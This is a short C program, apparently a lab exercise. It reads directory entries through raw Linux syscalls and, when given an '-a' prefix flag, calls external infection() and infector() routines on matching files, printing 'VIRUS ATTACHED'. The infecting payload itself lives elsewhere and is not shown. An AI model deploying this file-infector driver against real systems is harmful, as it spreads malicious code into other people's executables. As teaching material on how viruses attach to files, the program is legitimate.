#include "util.h"
#include <dirent.h>
#include <fcntl.h>


extern int system_call();
#define WRITE 4
#define STDOUT_OR_EXIT 1
#define CLOSE 6

struct linux_dirent {
    unsigned long  d_ino;
    unsigned long  d_off;
    unsigned short d_reclen;
    char           d_name[];
};
extern void infection();
extern void infector(char*);

int main(int argc, char const *argv[], char* envp[])
{
    int fd, count, should_attach = 0;
    struct linux_dirent *dirp;
    char buffer[8192];
    const char* prefix;

    if((fd = system_call(5,".", O_DIRECTORY | 0, 0)) < 0)
        system_call(STDOUT_OR_EXIT, 0x55);
    
    
    for(int i = 0; i < argc; i++){
        if(strlen(argv[i]) > 1 && argv[i][0] == '-' && argv[i][1] == 'a')
            should_attach = 1;
            prefix = &argv[i][2];
    }
    while(1){
        if((count = system_call(141, fd, buffer, 8192)) == 0)
            break;
        else if(count < 0)
            system_call(1, 0x55); //error exit
        else{
            char *buffer2 = buffer;
            while(buffer2 < buffer + count){
                dirp = (struct linux_dirent*) buffer2;
                if(should_attach && strncmp(dirp->d_name, prefix, strlen(prefix)) == 0){ //the name of the dir is the perfix
                    infection();
                    infector(dirp->d_name);
                    system_call(WRITE, STDOUT_OR_EXIT, "VIRUS ATTACHED ", strlen("VIRUS ATTACHED "));
                }
                system_call(WRITE, STDOUT_OR_EXIT, dirp->d_name, strlen(dirp->d_name));
                system_call(WRITE, STDOUT_OR_EXIT, "\n", 1);
                buffer2 = buffer2 + dirp->d_reclen;
            }
        }
    }
    system_call(CLOSE, 0);
    return 0;
}
